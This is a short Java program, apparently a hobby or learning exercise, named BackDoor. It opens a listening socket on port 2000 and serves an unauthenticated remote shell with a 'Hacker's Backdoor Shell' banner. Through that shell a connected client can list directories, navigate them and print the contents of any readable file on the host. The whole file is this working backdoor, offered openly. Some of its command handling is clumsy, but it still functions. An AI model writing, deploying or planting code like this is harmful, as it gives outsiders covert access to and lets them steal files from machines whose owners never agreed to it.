import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOError;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class BackDoor {

	public static void main(String[] args) throws IOException {

		
			ServerSocket server=new ServerSocket(2000);
			Socket client=server.accept();
			String workingDir=System.getProperty("user.dir");
			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
			System.out.println();
			
			InputStream in=client.getInputStream();
			OutputStream out=client.getOutputStream();
			
			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
		
			writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");
			
			while(true) {
				
				writer.write("\n\r"+workingDir+prompt);
				writer.flush();
				String clientCommand=reader.readLine();
				
				if(clientCommand.equalsIgnoreCase("cd .")) {
					writer.write("\nWorking directory is: "+workingDir+"\n\n");
				}
				
				 if(clientCommand.equalsIgnoreCase("dir")){
					writer.write("\nHere is a list of files in your current directory \n\n");
					File currentDirectory=new File(workingDir);
					File[] allFiles=currentDirectory.listFiles();
					
					for(File f:allFiles) {
					writer.write("\n\r"+f.getName()+(f.isDirectory()?" - Directory":" - file"));
			
					}
					
					
				}else if(clientCommand.startsWith("cd")){
						String d =clientCommand.split(" ")[1];
						File work;
						
						if(d.equalsIgnoreCase("..")) {
							work=new File(workingDir).getParentFile();
						}else {
							work=new File(workingDir+File.separator+d);
						}
						String temp=workingDir+File.separator+d;
						if(new File(temp).isDirectory()) {
							workingDir = temp;
						}
						else {
							writer.write("\n\r Directory doesn't exist:\n\r");
						}
						if(work.isDirectory()) {
							workingDir = work.getAbsolutePath();
						}
						
				       }else if(clientCommand.startsWith("cat")) {
							String b = clientCommand.split(" ")[1];
							
							String tempary=workingDir+File.separator+b;
							File file= new File(tempary);
							Scanner input = new Scanner(file);
							
							while(input.hasNext()){

					            String string = input.nextLine();

					            writer.write("\n\r"+string);
					        }
						}else {
						     writer.write("\n File does not exist");
						}
					}
				
		
		
		
	}		
}
